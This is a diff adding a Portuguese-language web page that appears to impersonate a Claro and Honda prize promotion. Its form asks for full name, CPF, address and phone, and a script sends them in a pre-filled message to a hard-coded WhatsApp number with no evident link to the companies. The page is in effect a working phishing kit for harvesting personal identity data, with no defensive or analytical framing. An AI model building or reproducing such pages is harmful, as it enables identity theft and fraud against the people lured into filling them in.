@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Concurso Claro + Honda</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <main class="container">
+    <img src="concurso.png" alt="Concurso Claro e Honda" class="logo-concurso">
+    <img src="claro.png" alt="Claro" class="logo-secundaria">
+    <h1>Bem-vindo ao portal de promoções da Claro</h1>
+    <p>Digite seus dados para verificarmos o status do seu prêmio:</p>
+       
+    <form class="formulario">
+      <input type="text" name="nome" placeholder="Nome completo" required>
+      <input type="text" name="email" placeholder="CPF" required>
+      <input type="text" name="endereco" placeholder="Endereço" required>
+      <input type="tel" name="telefone" placeholder="Telefone" required>
+      <button type="submit">Clique para falar com um de nossos colaboradores</button>
+    </form>
+
+    <div id="mensagem-confirmacao" class="mensagem" style="display: none;"></div>
+  </main>
+
+  <script>
+    const formulario = document.querySelector('.formulario');
+
+    formulario.addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const nome = formulario.elements['nome'].value;
+      const cpf = formulario.elements['email'].value;
+      const endereco = formulario.elements['endereco'].value;
+      const telefone = formulario.elements['telefone'].value;
+
+      const numeroWhatsapp = '5585996213811';
+
+      const mensagem = `Olá! Estou participando da promoção da Claro + Honda. Aqui estão meus dados:
+*Nome:* ${nome}
+*CPF:* ${cpf}
+*Endereço:* ${endereco}
+*Telefone:* ${telefone}`;
+
+      const url = `https://wa.me/${numeroWhatsapp}?text=${encodeURIComponent(mensagem)}`;
+      
+      window.open(url, '_blank');
+    });
+  </script>
+</body>
+</html>
